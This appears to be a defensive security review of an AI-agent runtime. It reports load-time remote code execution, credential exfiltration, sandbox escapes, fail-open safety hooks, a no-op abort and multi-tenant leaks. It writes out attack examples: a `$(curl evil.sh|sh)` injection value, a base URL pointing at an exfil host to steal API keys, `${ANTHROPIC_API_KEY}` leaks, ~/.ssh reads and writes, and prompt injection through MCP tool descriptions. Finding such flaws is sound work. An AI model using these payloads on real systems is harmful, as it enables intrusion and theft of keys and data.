# gitagent — Gap Review

**Scope:** `main` @ `d3e25d7` (published `@open-gitagent/gitagent@2.1.0`)
**Method:** Five deep passes — 2× context-management, security/RCE, MCP robustness, lifecycle/resource/multi-tenant — plus engine/compat analysis against `@mariozechner/pi-agent-core` & `pi-ai` (installed 0.70.6, latest 0.73.1). Line references are to `main` at review time.
**Status:** Findings only — no fixes applied.

---

## Verdict

gitagent ships the *vocabulary* of a safe, managed agent runtime — `abort`, `steer`, `maxTurns`, `constraints`, `compact.ts`, permission hooks, audit — but **~six of those are demonstrably disconnected**, the "agent = a git repo you fork and run" premise is a **load-time RCE/exfil vector**, and it under-uses the pi engine so badly that several capabilities it appears to "lack" are one config line away. Every reviewer independently flagged the **multi-tenant (JPMC per-employee) model as unsafe in a shared process**.

---

## TIER 0 — Untrusted-repo RCE & data exfil (existential)

- **G1 · Load-time shell-injection RCE.** `execSync(\`git clone "${manifest.extends}" ...\`)` (`loader.ts:182`, `:229`) and `execSync(\`git ${args}\`)` with `opts.session` (`session.ts:35,87`) interpolate untrusted `agent.yaml`/session fields. `extends: "$(curl evil.sh|sh)"` runs **on load, before any hook exists**. Fix already in-repo: `plugins.ts:162` uses `execFileSync` argv form.
- **G2 · API-key + full-conversation exfiltration via `model@baseUrl`.** `anthropic:…@https://exfil/v1` (or `GITAGENT_MODEL_BASE_URL`) makes gitagent copy the host key into the request and ship every prompt/file to the attacker (`loader.ts:396-421`). One YAML string, no injection needed.
- **G3 · Auto-spawn RCE.** Plugin `entry` is `import()`-ed and MCP `command` is spawned, auto-installed from a repo-declared `source` with no operator opt-in (`plugins.ts:241-252`, `mcp/manager.ts:168`, `sdk.ts:213`). `extends` can inject `mcp_servers` (deep-merged per-key → child `{command}` inherits parent `{args:[evil]}`).
- **G4 · `${VAR}` interpolation leaks host secrets** into plugin config & MCP headers/URLs (`env-utils.ts:12`, `plugins.ts:76`, `mcp/manager.ts:142`) — a malicious `"${ANTHROPIC_API_KEY}"` value exfiltrates to the plugin/remote server. Credentialed MCP URLs also leak into `console.warn` (`manager.ts:199`).
- **G5 · Safety hooks fail OPEN.** Every `executeHook` failure — no `sh` (Windows), crash, timeout, non-zero exit, non-JSON output — is swallowed → `allow` (`hooks.ts:139-154`). The one runtime gate inverts safe→unsafe. Default state = **no gate at all**.
- **G6 · Zero filesystem/exec jail on main.** `read ~/.ssh/id_rsa`, `write ~/.ssh/authorized_keys`, unrestricted `cli` all work (`read/write/edit.ts:7`, `cli.ts:30`); the "sandbox" path resolver doesn't jail either (`shared.ts:117`). MCP tools have **no permission gate** — a server's tool *description* can prompt-inject into the builtin `cli` shell (`manager.ts:113`).
- **G7 · Escapes & tamperable audit.** Symlink escape past the lexical hook guard (`hooks.ts:66`, no realpath); declarative-tool `script`/`runtime` escape with no containment (`tool-loader.ts:82`); audit is opt-in **and manifest-controlled**, agent-writable, logs secret args unredacted, and `logToolResult` is dead code (`audit.ts`).

## TIER 1 — The runtime control surface is fake

- **G8 · `query().abort()` is a no-op.** `ac` (`sdk.ts:93`) is wired to nothing; the Agent makes its own controller and `agent.abort()` is never called (CLI calls it correctly — `index.ts:836`). No kill switch: unbounded spend, e2b billing, un-killable subprocesses.
- **G9 · `query().steer()` is an empty body** (`sdk.ts:610`) while `agent.steer()` works — mid-run corrections ("don't push that") silently vanish.
- **G10 · `maxTurns` + all `constraints` (temp/max_tokens/topP) silently dropped.** `initialState` spread drops unknown keys (`sdk.ts:315`); the engine loop is `while(true)` with **no iteration cap**. `agent.yaml: max_turns: 56` is decoration; provider gets hardcoded `max_tokens = model.max/3`.
- **G11 · Multi-turn `AsyncIterable` prompt broken.** `channel.finish()` fires on the *first* `agent_end` (`sdk.ts:485`); turns 2..N run headless, pushing into a dead buffer. The documented multi-turn API is broken **and untested**, and there's no `messages`/`resume` alternative.
- **G12 · Early `break` doesn't cancel** — producer keeps running/billing; `return()`/`throw()` only `channel.finish()`, never abort (`sdk.ts:635`).

## TIER 2 — No context management (session-killing)

- **G13 · ~~Zero context-window management; overflow bricks the session.~~ FIXED.** `Compactor` (`src/compactor.ts`) is wired via `transformContext` in `sdk.ts` + `index.ts`; usage.input floors the budget; REPL `/clear` resets transcript + compactor; `QueryOptions.messages`/`resume` seed the engine. Remaining: Ctrl+C mid-tool can still orphan a `tool_use` → 400 (pair repair not yet added).
- **G14 · Tool-result caps are per-call, inconsistent, and *absent* for SDK/plugin tools** (`toAgentTool` bypasses `buildTool` — `tool-utils.ts:15`). ~6–8 large `cli`/`read` results ≈ 200k tokens → G13. Nothing prunes old results.
- **G15 · System prompt can blow the window before the first token** — unbounded SOUL/RULES/knowledge `always_load`/every `examples/*.md`, no length check vs `model.contextWindow` (`loader.ts:271-382`); custom models hardcode `contextWindow:128000` (an 8k local model lies).
- **G16 · ~~Token estimate unused for overflow.~~ PARTIAL.** Engine `Compactor` uses chars/3.5 + `usage.input` floor vs `model.contextWindow`. Public `compact.ts` helpers still use chars/4 for GCMessage API compat; deltas no longer double-counted; `needsCompaction` accepts optional `usageInput`. Still ignores system prompt + tool schemas in the estimate.

## TIER 3 — Leaks, crashes & multi-tenant unsafety

- **G17 · Hook-block early-returns leak the e2b VM and leave the GitHub PAT in `.git/config`** (finalize/sandbox-stop live outside the `finally`, `sdk.ts:548-575`). PAT also on the `git clone` command line (`ps`-visible) and pushed *before* the scrub.
- **G18 · `cli` timeout doesn't kill** (SIGTERM to `sh` only, no process-group/SIGKILL; settles on `close` not `exit`) → grandchildren survive, promise **hangs forever** → query never ends, span never exported, VM never stops (`cli.ts:40`). Output buffered unbounded before the 100k cap → OOM on `yes`.
- **G19 · Non-LLM failures reported as success** — infra throws become `session_end:"Agent finished"` with a resolved promise (`sdk.ts:485`); schedulers/CI/audit record success for failed runs.
- **G20 · Process-crash vectors:** unhandled rejection from `throw null` or a sync-throwing `onError` inside the `.catch` (`sdk.ts:589`); EPIPE crash when a hook script exits without reading stdin (`hooks.ts:92`, no `stdin.on('error')`). One tenant's bad hook kills every tenant.
- **G21 · Scheduler self-destructs:** `runningJobs.delete` not in `finally` → a throw permanently wedges a schedule; cron callbacks aren't `.catch`-ed → process exit; far-future `once` schedules fire *immediately* (`setTimeout` >24.8d clamps to 1ms); `activeTasks`/`runningJobs` are module globals → cross-tenant collisions + orphaned untracked cron tasks (`schedule-runner.ts`).
- **G22 · Cross-tenant bleed in one process:** `process.env.OPENAI_API_KEY = providerKey` global mutation (`loader.ts:415`) → tenant B authenticates with tenant A's key; telemetry is a global singleton (tenant B's spans → tenant A's collector *with A's auth headers*); MCP `SIGTERM` (docker/k8s default) skips cleanup → zombie children per container.
- **G23 · Synchronous git blocks the whole event loop** (`execSync` clone/fetch/push in `session.ts`/`loader.ts`) → head-of-line blocking for every tenant in an embedding server.

## TIER 4 — MCP robustness, cost, correctness, hygiene

- **G24 · Cost = $0 for every gateway/custom-endpoint model** (`createCustomModel` hardcodes `cost:{0,0,0,0}`, `loader.ts:96`) — on the `localhost:8090` gateway setup, `q.costs()` and `gitagent.cost_usd` are permanently zero. Chargeback is fiction exactly where JPMC needs it.
- **G25 · Mutating tools run in PARALLEL → file/git corruption.** Engine default `toolExecution:"parallel"`; gitagent sets its own ignored `isConcurrencySafe` but never `executionMode` (`tool-factory.ts:26`, `agent-loop.js:226`). Two `write`s / `edit`+`git commit` / `memory`-save race → `index.lock`, corrupt files, lost writes.
- **G26 · MCP fragility:** `options.tools` bypass the collision check → duplicate name → provider 400 kills the session (a hostile server can pick colliding names = DoS, `sdk.ts:217`); `timeoutMs` ignored for `listTools` (hardcoded 30s); `listTools` is **serial** → 5 slow servers = 150s dead air before first token; failures are `console.warn`-only (invisible to model + stream); schema conversion flattens `$ref`/`oneOf`/dict-args to "no parameters" (`tool-loader.ts:27`); image/audio results discarded; `isError` not propagated (failure hooks blind); unbounded intake before truncation (multi-GB result → OOM).
- **G27 · Memory/history hygiene:** `collectedMessages` retains every delta ~2× forever + channel has no backpressure (`sdk.ts:108`); chat-history JSONL grows unbounded with full-file **sync** reads on the hot path (`chat-history.ts`); `MEMORY.md` load is uncapped and `save` re-sends the whole file (2× tokens); `memory.ts:170` commit message escapes only `"` → **shell injection** on `` ` ``/`$()`.
- **G28 · Stale/under-used engine.** Pinned `^0.70.2` (locked to 0.70.x; latest **0.73.1** — safe upgrade, `Agent`/`agent-loop` API byte-identical, adds current model IDs/providers/`thinkingLevelMap`). gitagent passes only `initialState` to `new Agent()` — unused: `transformContext` (compaction), `toolExecution`, `beforeToolCall/afterToolCall`, `thinkingBudgets`, `transport`, `maxRetryDelayMs`, `followUp`, `waitForIdle`, `getApiKey`. Note: parallel tools + retry are already built-in, *not* "own-the-loop" work.

---

## Remediation order (highest leverage first)

### Quick wins (hours, mostly 1–5 lines)
1. `execFileSync` for all 3 git-injection sites (**G1**)
2. Redact/ban the `@baseUrl` key-copy from untrusted manifests (**G2**)
3. `stdin.on('error')` + make `pre_tool_use`/`on_session_start` hooks fail **closed** (**G5, G20**)
4. `runningJobs.delete` in `finally` + `.catch` the cron callbacks (**G21**)
5. Wire `ac` → `agent.abort()` and `steer` → `agent.steer()` (**G8, G9**)
6. Call `mcpSetup.cleanup()` on `SIGTERM` (**G26**)

### Structural (the real work)
7. ~~Wire `transformContext` → Compactor + usage-based token guard; add `/clear` + `QueryOptions.messages`/`resume`.~~ **Done (G13, partial G16).** G14 (SDK/plugin tool-result caps) still open.
8. Realpath filesystem jail + `cli` allow/deny policy on main; gate plugin/MCP spawn + MCP tools behind operator opt-in / permissions (**G3, G6, G7**).
9. Move `finalize`/sandbox-stop into `finally`; fix cleanup ordering; process-group kill + SIGKILL + settle-on-`exit` in `cli` (**G17, G18**).
10. Multi-tenant: stop mutating `process.env`, per-instance telemetry, per-agentDir scheduler state — or **mandate process-per-tenant** for JPMC (**G22**).
11. `executionMode:"sequential"` on mutating tools (**G25**); real cost table / gateway usage parsing (**G24**); bump pi to 0.73.x (**G28**).

---

## Cross-cutting themes

- **"Vocabulary without wiring":** `abort`, `steer`, `maxTurns`, `constraints`, `compact.ts`, `maxResultSizeChars` are all present in the API and disconnected from the runtime.
- **Untrusted manifest = attacker input:** the "agents as repos" premise means `agent.yaml`/`extends`/plugins/`mcp_servers` are attacker-reachable; today loading one is RCE/exfil.
- **Multi-tenant is unsafe in a shared process** (`process.env` mutation, telemetry & scheduler globals, sync git) — for the JPMC per-employee deployment the only current mitigation is process-per-tenant, and even that leaks on hangs.
- **The engine is stronger than gitagent uses it** — compaction (`transformContext`), parallel tools, retry, steering, idle detection are all available in 0.70+ and unused.
